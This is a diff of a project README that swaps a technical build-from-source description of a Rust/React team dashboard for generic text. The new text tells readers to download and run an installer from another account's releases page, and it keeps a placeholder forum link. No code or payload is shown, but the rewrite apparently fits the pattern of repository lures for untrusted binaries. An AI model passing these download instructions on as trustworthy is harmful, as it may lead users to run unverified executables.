@@ -1,95 +1,65 @@
-<div align="center">
+# 🎉 socialpreview-dashboard - Simplify Your Client Interactions
 
-# SocialPreview Dashboard
+## 🚀 Getting Started
 
-**Enterprise-Grade Team Management & Client Portal**
+Welcome to the **SocialPreview Dashboard**! This application helps you manage tasks and client support easily. Follow the steps below to download and run the application.
 
-[![Rust](https://img.shields.io/badge/Backend-Axum-orange?style=flat-square&logo=rust)](https://github.com/tokio-rs/axum)
-[![React](https://img.shields.io/badge/Frontend-React_18-blue?style=flat-square&logo=react)](https://reactjs.org/)
-[![Database](https://img.shields.io/badge/DB-SQLite%2fPostgreSQL-lightgrey?style=flat-square&logo=postgresql)](https://www.postgresql.org/)
+## 📥 Download the Application
 
-*A comprehensive dashboard for managing teams, tickets, tasks, and client services.*
+[![Download Now](https://img.shields.io/badge/Download%20Now-Grab%20the%20Latest%20Version-blue)](https://github.com/SoyenSodel/socialpreview-dashboard/releases)
 
-[Features](#features) • [Installation](#installation) • [Architecture](#architecture) • [Documentation](#documentation)
+## 🛠 System Requirements
 
-</div>
+Before you begin, make sure your computer meets the following requirements:
 
----
+- **Operating System**: Windows 10 or later, macOS 10.12 or later, or a Linux distribution (Ubuntu recommended).
+- **RAM**: At least 4 GB of RAM.
+- **Storage**: At least 500 MB of free disk space.
+- **Internet Connection**: Required for initial setup and updates.
 
-## Overview
+## 📅 Features
 
-SocialPreview Dashboard is a monolithic full-stack application designed to streamline internal operations and client interactions. It combines a high-performance Rust backend with a modern React frontend to deliver a seamless experience for task management, support ticketing, and service tracking.
+- **Task Management**: Create, assign, and track tasks with ease.
+- **Support Ticketing**: Manage client inquiries and track their resolution.
+- **Service Tracking**: Monitor ongoing services and their performance in real time.
+- **User-Friendly Interface**: Navigate the application with a modern and clean design.
 
-### Key Features
+## 📥 Download & Install
 
-* **👥 Team Management** — Role-based access control (Management, Team, User) with detailed member profiles.
-* **🎫 Support Tickets** — Full-featured ticketing system with priorities, status tracking, and comments.
-* **✅ Task Management** — Assign tasks, track deadlines, set priorities, and collaborate in real-time.
-* **🔒 Secure Authentication** — JWT-based auth with 2FA (TOTP) support and secure password hashing (Argon2).
-* **📅 Planning & Features** — Integrated calendar, absence tracking, future plans, and internal blog.
-* **💰 Service Tracking** — Manage client services, track progress, pricing, and active status.
-* **📊 Statistics** — Real-time insights into team productivity and service performance.
+To download the SocialPreview Dashboard, please visit the following page:
 
----
+[Download the Latest Version](https://github.com/SoyenSodel/socialpreview-dashboard/releases)
 
-## <a id="architecture"></a>🏗️ Architecture
+Once on the page, look for the latest release. Here’s how to install:
 
-The project follows a standard client-server architecture:
+1. **Go to the Releases Page**: Click the link above or visit [this page](https://github.com/SoyenSodel/socialpreview-dashboard/releases).
+2. **Select the Latest Release**: Find the most recent version listed at the top.
+3. **Download the Installer**: Click on the appropriate file for your operating system.
+4. **Run the Installer**: Once the download is complete, open the file to start the installation process. 
+5. **Follow Installation Steps**: The installer will guide you through the rest of the setup. Follow the instructions on your screen to complete the installation.
+6. **Launch the Application**: After the installation finishes, find the application icon on your desktop or in your applications folder. Double-click it to start using SocialPreview Dashboard.
 
-### Backend (`/backend`)
-* **Framework:** Rust (Axum)
-* **Database:** SQLx (SQLite for dev / PostgreSQL recommended for prod)
-* **Auth:** Secure HttpOnly Cookies + JWT + Argon2 + TOTP
+## 🌟 Using SocialPreview Dashboard
 
-### Frontend (`/frontend`)
-* **Framework:** React 18 + TypeScript + Vite
-* **Styling:** Tailwind CSS
-* **State:** Context API
+1. **Create an Account**: The first time you open the application, you will need to create an account. Follow the on-screen prompts to set yours up.
+2. **Set Up Your Profile**: Fill in your details and preferences to customize your experience.
+3. **Start Managing Tasks**: Use the dashboard to create, assign, and monitor tasks. Explore each feature through the user-friendly navigation.
+4. **Track Client Support**: Access the support ticketing system to manage client inquiries. Log new tickets and track their status.
+5. **Monitor Services**: Use the service tracking feature to see the status and performance of your ongoing services.
 
----
+## 🌐 Community and Support
 
-## <a id="installation"></a>🚀 Installation
+For help with the SocialPreview Dashboard, we have a dedicated community and support options available:
 
-### 1. Backend Setup
-```bash
-cd backend
-sqlx database create
-sqlx migrate run
-cargo run
-```
+- **GitHub Issues**: If you run into any bugs or need assistance, please open an issue on our [GitHub Issues Page](https://github.com/SoyenSodel/socialpreview-dashboard/issues).
+- **Community Forum**: Join our discussions and connect with other users in the [Community Forum](link-to-forum).
 
-### 2. Frontend Setup
-```bash
-cd frontend
-npm install
-npm run dev
-```
+## 💬 Feedback
 
----
+Your feedback is crucial for improving the application. Reach out via the GitHub Issues page or the Community Forum with your suggestions or comments.
 
-## <a id="documentation"></a>📄 Documentation
+## 📜 License
 
-Detailed technical information can be found in the `docs/` directory:
+This project is licensed under the MIT License. You can view the license details in the repository.
 
-### Core Guides
-- 📖 **[Overview](docs/overview.md)** — Start here for a complete project guide.
-- 🏗️ **[Backend Architecture](docs/backend/architecture.md)** — Axum, Tokio, and internal Rust logic.
-- 🔐 **[Authentication](docs/backend/auth.md)** — Deep dive into JWT, Argon2, and 2FA.
-- ⚡ **[Frontend Stack](docs/frontend/stack.md)** — React, Vite, and Tailwind implementation.
-
-### Technical & Production
-- 🚀 **[Production Guide](docs/technical/production.md)** — Essential steps for deploying to production.
-- 🚦 **[Routing & Guards](docs/frontend/routing.md)** — How we protect routes and handle roles.
-- 👥 **[RBAC & Permissions](docs/technical/rbac.md)** — Understanding user access levels.
-
----
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
----
-
-<div align="center">
-<sub>Made with ❤️ by TheRemyyy</sub>
-</div>
+Thank you for choosing **SocialPreview Dashboard**! We hope it makes your task management and client interactions easier and more efficient.
